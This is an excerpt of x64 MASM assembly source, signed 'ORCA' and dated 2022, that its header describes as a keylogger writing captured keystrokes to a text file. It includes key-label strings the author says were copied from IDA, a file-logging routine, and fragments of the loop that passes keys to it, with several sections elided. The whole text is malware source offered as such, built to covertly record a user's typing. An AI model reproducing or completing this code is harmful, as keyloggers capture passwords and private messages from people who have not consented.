; ORCA on 11:35 AM 6/19/2022
; masm style keylogger, that print output to a txt file
...
PrintChars		byte '%s', 0
;------------------------------------------------------------------------------------------------------------
; btw dont feel sorry about me writing the following arrays, i copied these from ida, so yeah i didnt write these directly :)
aBks            byte '[BKS]',0          
aTab			byte 9,0                 
aEnt			byte 0Ah,0                
aCtr            byte '[CTR]',0           
...
lop		dword ?
fp		qword ?
fpkey	qword ?				; this will save a pointer to the actual key output
...
WriteToFile proc
	sub     rsp, 0E8h
	mov		qword ptr [fpkey], rdx	; saving the value of rdx in fpkey
	cmp		fp, 0
	jnz		validfp
	lea     rcx, file
	call	remove			; removing in case file exist
	lea		rdx, per		; u could do 'a' directly
	lea     rcx, file
	call	fopen
	mov		fp, rax

validfp:
	mov		rcx, qword ptr [fpkey]		; expecting args to be in fpkey
	call	strlen
	mov		rcx, qword ptr [fpkey]		; fwrite parms (buffer)
	mov		rdx, rax					; fwrite parms (size of buffer || strlen return)
...
WhileLoop:													
	...
	movsxd  rax, lop
	lea     rcx, chararray
	mov     rdx, [rcx+rax*8]		; rdx is the arg (using mov cz the return of rcx+rax*8 is already a ptr || offset)
	call	WriteToFile
	mov     eax, 1
	jmp bye
...
SearchAndWrite proc
	...
	mov     arg, eax
	lea		rdx, byte ptr [arg] ; here, we are using lea instead of mov cz we need a pointer in WriteToFile 
	call	WriteToFile
	jmp		bye
